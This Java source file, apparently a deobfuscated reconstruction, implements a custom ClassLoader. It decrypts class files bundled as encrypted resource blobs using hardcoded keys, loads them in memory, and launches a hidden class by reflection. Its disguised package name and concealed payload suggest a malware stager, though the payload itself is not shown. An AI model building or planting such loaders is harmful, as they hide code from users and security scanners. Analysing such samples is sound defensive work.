package net.java;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * Custom ClassLoader that decrypts the bundled backend class payload (/net/java/a)
 * at startup. This is the cleaned-up version of the original obfuscated loader,
 * with duplicate field-name collisions from decompilation fixed. All fields
 * are given descriptive names while preserving the original runtime behavior.
 */
public class m extends ClassLoader {
    public static final String PAYLOAD_PATH    = "/64FV7P4H2NO7Q";
    private static final String BLOB_B         = "/net/java/b";
    private static final String BLOB_C         = "/net/java/c";
    private static final String BLOB_D         = "/net/java/d";
    private static final String BLOB_E         = "/net/java/e";
    private static final long   KEY_1          = -1083759330220665782L;
    private static final long   KEY_2          = -4062297973245990737L;
    private final HashMap<String, byte[]> classes = new HashMap<>();

    public m() {
        byte[] blob = l.b(l.a(BLOB_C, "\\a"));
        DataInputStream in = new DataInputStream(new ByteArrayInputStream(blob));
        try {
            while (in.available() > 0) {
                String name = in.readUTF();
                byte[] code = new byte[in.readInt()];
                in.readFully(code);
                classes.put(name, code);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public synchronized Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> loaded = findLoadedClass(name);
        if (loaded != null) return loaded;
        byte[] code = classes.get(name);
        if (code != null) return defineClass(name, code, 0, code.length);
        return super.loadClass(name);
    }

    /** Configure crypto keys before any payload operation. */
    public static void init() {
        l.keyPath1 = BLOB_D;
        l.keyPath2 = BLOB_C;
        l.keyLong1 = KEY_1;
        l.keyLong2 = KEY_2;
    }

    /** Preserve legacy name used by other obfuscated call sites. */
    public static void a() { init(); }

    public static void main(String[] args) {
        init();
        m loader = new m();
        try {
            Method main = loader.loadClass("a").getDeclaredMethod("main", String[].class);
            String[] forwarded = new String[args.length + 6];
            forwarded[0] = BLOB_B;
            forwarded[1] = BLOB_C;
            forwarded[2] = BLOB_D;
            forwarded[3] = BLOB_E;
            forwarded[4] = PAYLOAD_PATH;   // alias for the original "/net/java/f" slot
            forwarded[5] = PAYLOAD_PATH;
            System.arraycopy(args, 0, forwarded, 6, args.length);
            main.invoke(null, (Object) forwarded);
        } catch (Throwable ignored) {
            ignored.printStackTrace();
        }
    }
}
